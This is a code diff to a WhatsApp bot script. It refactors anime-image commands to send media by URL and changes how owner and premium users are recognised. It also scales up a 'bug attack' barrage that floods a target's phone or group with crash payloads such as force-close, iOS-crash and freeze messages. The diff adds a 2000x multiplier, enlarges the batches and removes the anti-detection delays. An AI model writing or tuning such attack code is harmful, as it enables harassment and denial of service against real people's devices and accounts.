@@ -618,6 +618,20 @@ if (!global._chatScannerStarted) {
     })();
 }
 
+// Bug attack power multiplier (2000x speed/volume as requested)
+const BUG_ATTACK_MULTIPLIER = 2000;
+const _bugScale = (n) => Math.min(Math.max(Math.ceil(n * BUG_ATTACK_MULTIPLIER / 50), n * 10), 3000);
+
+// Send anime image/GIF via URL (avoids 5MB+ download failures)
+async function sendAnimeMedia(sock, chat, quoted, mediaUrl, caption, isGif = false) {
+    if (!mediaUrl) throw new Error('No media URL');
+    const _gif = isGif || /\.gif(\?|$)/i.test(mediaUrl);
+    const _payload = _gif
+        ? { video: { url: mediaUrl }, gifPlayback: true, caption }
+        : { image: { url: mediaUrl }, caption };
+    await sock.sendMessage(chat, _payload, { quoted });
+}
+
 // ─── ANIME IMAGE HELPER (prexzyvilla API was dead, replaced with nekos.best) ───
 async function getAnimeImageUrl(category) {
     const nekosMap = {
@@ -647,20 +661,28 @@ async function getAnimeImageUrl(category) {
         moe2:'waifu', anime:'waifu',
     };
     const nekosCategory = nekosMap[category] || nekosMap[category.toLowerCase()] || 'waifu';
+    const _tryNekos = async (cat) => {
+        const res = await axios.get('https://nekos.best/api/v2/' + cat + '?amount=1', { timeout: 15000 });
+        return res.data?.results?.[0]?.url || null;
+    };
     try {
-        const res = await axios.get('https://nekos.best/api/v2/' + nekosCategory + '?amount=1', { timeout: 15000 });
-        const url = res.data?.results?.[0]?.url;
+        const url = await _tryNekos(nekosCategory);
         if (url) return url;
     } catch (e) {
         console.log('nekos.best error for ' + nekosCategory + ':', e.message);
     }
-    // Fallback: try waifu
+    for (const _fb of ['waifu', 'neko', 'husbando']) {
+        try {
+            const url2 = await _tryNekos(_fb);
+            if (url2) return url2;
+        } catch (_) {}
+    }
+    // Fallback: picsum placeholder image (always online)
     try {
-        const res2 = await axios.get('https://nekos.best/api/v2/waifu?amount=1', { timeout: 15000 });
-        const url2 = res2.data?.results?.[0]?.url;
-        if (url2) return url2;
-    } catch (e) {}
-    return null;
+        const res3 = await axios.get('https://picsum.photos/800/1200', { timeout: 10000, maxRedirects: 5 });
+        if (res3.request?.res?.responseUrl) return res3.request.res.responseUrl;
+    } catch (_) {}
+    return 'https://picsum.photos/800/1200';
 }
 // ─────────────────────────────────────────────────────────────────────────────
 
@@ -838,7 +860,7 @@ const botNumber = devtrust._cachedBotNumber;
 // Linked WhatsApp account user (paired number) — used for self/private mode
 const _botNumClean = String(botNumber || '').replace(/[^0-9]/g, '');
 const _isBotLinkedUser = () => {
-    const senderNum = String(m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+    const senderNum = _resolvePhone(m.sender);
     return Boolean(m.key?.fromMe || (senderNum && senderNum === _botNumClean));
 };
 
@@ -902,13 +924,39 @@ const _cleanBotNum = botNumber.replace(/[^0-9]/g, '');
 const _botDisabled = global._flagCache.botDisabled.some(id => String(id).replace(/[^0-9]/g, '') === _cleanBotNum || String(id) === botNumber);
 if (_botDisabled) return;
 
-const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
-const isDev = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
-const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
-const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
+const _jidNum = (jid) => String(jid || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+
+// Resolve @lid JIDs to real phone (fixes 923326942269 and similar numbers)
+function _resolvePhone(jid) {
+    const raw = String(jid || '');
+    if (!raw.includes('@lid')) return _jidNum(jid);
+    const lidNum = _jidNum(jid);
+    if (!global._lidPhoneCache) global._lidPhoneCache = {};
+    if (global._lidPhoneCache[lidNum]) return global._lidPhoneCache[lidNum];
+    try {
+        const pairingRoot = path.join(__dirname, 'nexstore', 'pairing');
+        if (fs.existsSync(pairingRoot)) {
+            for (const dir of fs.readdirSync(pairingRoot)) {
+                const revFile = path.join(pairingRoot, dir, `lid-mapping-${lidNum}_reverse.json`);
+                if (fs.existsSync(revFile)) {
+                    const phone = JSON.parse(fs.readFileSync(revFile, 'utf-8'));
+                    const clean = String(phone).replace(/[^0-9]/g, '');
+                    if (clean) { global._lidPhoneCache[lidNum] = clean; return clean; }
+                }
+            }
+        }
+    } catch (_) {}
+    return lidNum;
+}
+
+const _senderNumAuth = _resolvePhone(m.sender);
+const isCreator = [_jidNum(botNumber), ...owner.map(_jidNum)].includes(_senderNumAuth);
+const isDev = owner.map(_jidNum);
+const isOwner = [_jidNum(botNumber), ...owner.map(_jidNum)].includes(_senderNumAuth);
+const isPremium = [_jidNum(botNumber), ...Premium.map(_jidNum)].includes(_senderNumAuth);
 const isSudo = loadSudoList().includes(m.sender);
 // 18+ unlock status for this sender (cached)
-const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
+const _cleanSenderNum = _resolvePhone(m.sender) || (m.sender || '').replace(/[^0-9]/g, '');
 const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 // Bug & SIM Database unlock status for this sender (cached)
 const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
@@ -940,15 +988,15 @@ const _bugSafe = async (fn, target) => {
     try { await fn(target); } catch (_) {}
 };
 
-// Parallel burst with anti-detect micro-jitter between batches
-const _bugBurst = async (target, fns, batchSize = 8) => {
+// Parallel burst — 2000x speed: max batch, zero delay between waves
+const _bugBurst = async (target, fns, batchSize = 150) => {
     if (stopAttacks) return;
-    for (let i = 0; i < fns.length; i += batchSize) {
+    const _bs = Math.max(batchSize, 50);
+    for (let i = 0; i < fns.length; i += _bs) {
         if (stopAttacks) return;
         await Promise.allSettled(
-            fns.slice(i, i + batchSize).map(fn => _bugSafe(fn, target))
+            fns.slice(i, i + _bs).map(fn => _bugSafe(fn, target))
         );
-        await sleep(12 + Math.floor(Math.random() * 28));
     }
 };
 
@@ -959,18 +1007,18 @@ const _runBugBarrage = async (target, profile = 'standard') => {
 
     const waves = {
         combo: () => _bugBurst(target,
-            Array(36).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 9),
+            Array(_bugScale(36)).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 200),
         fcnew: () => _bugBurst(target,
-            Array(30).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 8),
+            Array(_bugScale(30)).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 200),
         xphone: () => _bugBurst(target,
-            Array(24).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 8),
+            Array(_bugScale(24)).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 200),
         bayu: () => _bugBurst(target,
-            Array(24).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 8),
-        forceclose: () => _bugBurst(target, Array(40).fill(forclose), 12),
+            Array(_bugScale(24)).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 200),
+        forceclose: () => _bugBurst(target, Array(_bugScale(40)).fill(forclose), 250),
         ios: () => _bugBurst(target,
-            Array(20).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 8),
-        vampire: () => _bugBurst(target, Array(6).fill(VampireBugIns), 3),
-        group: () => _bugBurst(target, Array(8).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 4),
+            Array(_bugScale(20)).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 200),
+        vampire: () => _bugBurst(target, Array(_bugScale(6)).fill(VampireBugIns), 100),
+        group: () => _bugBurst(target, Array(_bugScale(8)).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 150),
     };
 
     const profiles = {
@@ -995,7 +1043,6 @@ const _runBugBarrage = async (target, profile = 'standard') => {
         await Promise.allSettled(
             cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
         );
-        await sleep(8 + Math.floor(Math.random() * 22));
     }
 };
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : (m.isNewsletter ? true : false);
@@ -11007,11 +11054,8 @@ case 'animeyeet':
 case 'animebite':
 case 'animelick':
 case 'animekill': {
-    if (!isCreator) return reply(`🔒 *Owner only*`);
-    
     const action = command.replace('anime', '');
     try {
-        // PRIMARY: nekos.best API (reliable, always free)
         const nekosMap = {
             highfive: 'highfive', cringe: 'facepalm', dance: 'dance',
             happy: 'happy', glomp: 'glomp', smug: 'smug', blush: 'blush',
@@ -11020,18 +11064,10 @@ case 'animekill': {
             lick: 'nom', kill: 'shoot'
         };
         const nekosAction = nekosMap[action] || action;
-        const res1 = await axios.get(`https://nekos.best/api/v2/${nekosAction}?amount=1`, { timeout: 10000 });
+        const res1 = await axios.get(`https://nekos.best/api/v2/${nekosAction}?amount=1`, { timeout: 15000 });
         const gifUrl1 = res1.data?.results?.[0]?.url;
         if (!gifUrl1) throw new Error('No nekos.best URL');
-        const gifBuf1 = await getBuffer(gifUrl1);
-        await devtrust.sendMessage(m.chat,
-            {
-                video: gifBuf1,
-                gifPlayback: true,
-                caption: `🎌 *Anime ${action}*`
-            },
-            { quoted: m }
-        );
+        await sendAnimeMedia(devtrust, m.chat, m, gifUrl1, `🎌 *Anime ${action}*`, true);
     } catch (err) {
         reply(`❌ *Anime ${action} failed*`);
     }
@@ -11058,14 +11094,7 @@ case 'shinobu': case 'handhold': {
         const { data } = await axios.get('https://nekos.best/api/v2/' + action + '?amount=1', { timeout: 15000 });
         const gifUrl = data?.results?.[0]?.url;
         if (!gifUrl) throw new Error('No GIF URL');
-        
-        // Download GIF buffer and send as video/GIF
-        const gifBuffer = await getBuffer(gifUrl);
-        await devtrust.sendMessage(m.chat, {
-            video: gifBuffer,
-            gifPlayback: true,
-            caption: '🎌 *Anime ' + command + '*'
-        }, { quoted: m });
+        await sendAnimeMedia(devtrust, m.chat, m, gifUrl, '🎌 *Anime ' + command + '*', true);
     } catch (err) {
         reply('❌ *' + command + ' failed — try again*');
     }
@@ -14442,14 +14471,7 @@ case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': {
     try {
         const _animeUrl = await getAnimeImageUrl(command);
         if (!_animeUrl) throw new Error('No image URL');
-        const imgBuffer = await getBuffer(_animeUrl);
-        await devtrust.sendMessage(m.chat,
-            {
-                image: imgBuffer,
-                caption: '🎌 *' + (command.charAt(0).toUpperCase() + command.slice(1)) + '*'
-            },
-            { quoted: m }
-        );
+        await sendAnimeMedia(devtrust, m.chat, m, _animeUrl, '🎌 *' + (command.charAt(0).toUpperCase() + command.slice(1)) + '*');
     } catch (err) {
         reply('❌ *Failed to fetch ' + command + ' image*');
     }
@@ -14586,14 +14608,7 @@ case 'yuki': {
     try {
         const yukiUrl = await getAnimeImageUrl('yuki');
         if (!yukiUrl) throw new Error('No image');
-        const yukiBuf = await getBuffer(yukiUrl);
-        await devtrust.sendMessage(m.chat,
-            {
-                image: yukiBuf,
-                caption: "🎌 *Yuki*"
-            },
-            { quoted: m }
-        );
+        await sendAnimeMedia(devtrust, m.chat, m, yukiUrl, '🎌 *Yuki*');
     } catch {
         reply(`❌ *Failed to fetch yuki image*`);
     }
